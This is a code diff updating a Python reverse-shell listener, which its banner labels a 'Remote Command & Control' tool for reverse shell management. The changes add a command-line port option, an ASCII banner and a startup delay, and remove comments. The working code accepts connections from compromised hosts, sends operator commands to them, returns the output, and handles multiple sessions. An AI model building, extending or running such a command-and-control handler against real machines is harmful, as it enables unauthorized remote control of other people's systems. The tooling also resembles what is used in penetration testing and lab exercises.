@@ -2,6 +2,7 @@ import socket
 import threading
 import sys
 import queue
+import time
 
 # ANSI escape codes for colors
 RED = "\033[91m"
@@ -11,7 +12,7 @@ BLUE = "\033[94m"  # Blue for LSTNR$
 ORANGE = "\033[38;5;214m"  # Orange for Session prompt
 
 HOST = "0.0.0.0"
-PORT = 21
+PORT = None  # Port will be set from command-line arguments
 
 sessions = {}
 session_id = 0
@@ -21,7 +22,7 @@ notifications = queue.Queue()  # Queue to store new session messages
 
 def print_error(error_message):
     """Prints errors in red."""
-    print(f"{RED}[!] ERROR due to {error_message}{RESET}")
+    print(f"{RED}[!] ERROR: {error_message}{RESET}")
 
 def print_commands():
     """Prints a formal list of available commands."""
@@ -38,13 +39,11 @@ def handle_client(client_socket, addr, session_number):
 
     try:
         while True:
-            # Create the custom prompt for the session with orange color
             prompt = f"{ORANGE}Session[{session_number}]@{addr[0]}: {RESET}"
             command = input(prompt).strip()
 
-            # Skip sending empty commands to the client
             if command == "":
-                continue  # Prompt for input again without sending anything to the client
+                continue
 
             if command.lower() == "bs":
                 print(f"[*] Session {session_number} moved to background.")
@@ -57,32 +56,22 @@ def handle_client(client_socket, addr, session_number):
                     del sessions[session_number]
                 return
 
-            # Send command to client
             client_socket.send(command.encode() + b"\n")
 
-            # Now read the response completely
             response = ""
             while True:
                 part = client_socket.recv(4096).decode(errors="ignore")
                 response += part
-                # If no more data is available, break the loop
                 if len(part) < 4096:
                     break
 
-            # Remove the system prompt (like Windows PS prompt)
             if response:
                 response = '\n'.join([line for line in response.splitlines() if not line.startswith('PS ')])
-                
-                # Print the response after fully receiving it
-                print(f"\n{response}", end="")  # Add a newline after the response
-                
-                # Ensure the next prompt appears on a new line
-                print(f"\n")
+                print(f"\n{response}", end="\n\n")
 
     except KeyboardInterrupt:
-        # Catch Ctrl+C and background the session
         print(f"\n[*] Session {session_number} moved to background.")
-        return  # Move to the main menu
+        return
     except Exception as e:
         print_error(str(e))
 
@@ -92,22 +81,20 @@ def handle_client(client_socket, addr, session_number):
 
 def session_manager():
     """Main menu that allows session management."""
+    time.sleep(1)  # 🟢 Wait for 1 second before dropping into LSTNR$
+    
     while True:
         try:
-            # Print any pending connection notifications before prompting input
             while not notifications.empty():
                 print(notifications.get())
 
-            # Manager prompt in blue
             command = input(f"{BLUE}LSTNR$ {RESET}").strip()
-            if command == "":  # If user presses Enter without typing anything
-                print_commands()  # Show acceptable commands
+            if command == "":
+                print_commands()
             elif command.lower() == "ls":
-                # Show new connections first
                 while not notifications.empty():
                     print(notifications.get())
 
-                # Print the sessions in a table format
                 print("\n+-----------------------+")
                 print("| ID  | IP ADDRESS      |")
                 print("+-----------------------+")
@@ -137,7 +124,7 @@ def session_manager():
                 break
             else:
                 print_error("Unknown command. Use 'ls', 'cs <id>', 'bs', 'exit', or 'die'.")
-                print_commands()  # Print the formal menu
+                print_commands()
         except KeyboardInterrupt:
             print("\n[*] Type 'exit' to close LSTNR.")
         except Exception as e:
@@ -146,9 +133,8 @@ def session_manager():
 def start_listener():
     """Starts the listener and accepts incoming connections."""
     global session_id
+
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    # Allow immediate port reuse after script stops
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
     try:
@@ -158,20 +144,41 @@ def start_listener():
         sys.exit(1)
 
     server.listen(5)
+    print(""" 
+    ██╗     ███████╗████████╗███╗   ██╗██████╗ 
+    ██║     ██╔════╝╚══██╔══╝████╗  ██║██╔══██╗
+    ██║     ███████╗   ██║   ██╔██╗ ██║██████╔╝
+    ██║     ╚════██║   ██║   ██║╚██╗██║██╔══██╗
+    ███████╗███████║   ██║   ██║ ╚████║██║  ██║
+    ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝
+    Remote Command & Control - v1.3
+    - MADE FOR REVERSE SHELL MANAGEMENT
+    """)
     print(f"[*] Listening on {HOST}:{PORT}")
-
+    
     while True:
         try:
             client_socket, addr = server.accept()
             with lock:
                 session_id += 1
                 sessions[session_id] = {"socket": client_socket, "addr": addr}
-            # Store the message instead of printing immediately, in green
             notifications.put(f"{GREEN}[+] New connection from {addr}. Assigned Session ID: {session_id}{RESET}")
         except Exception as e:
             print_error(str(e))
 
 if __name__ == "__main__":
+    if len(sys.argv) != 3 or sys.argv[1] != "-p":
+        print_error("Usage: ./listener.py -p <port>")
+        sys.exit(1)
+
+    try:
+        PORT = int(sys.argv[2])
+        if PORT < 1 or PORT > 65535:
+            raise ValueError
+    except ValueError:
+        print_error("Invalid port number. Use a port between 1 and 65535.")
+        sys.exit(1)
+
     try:
         listener_thread = threading.Thread(target=start_listener, daemon=True)
         listener_thread.start()
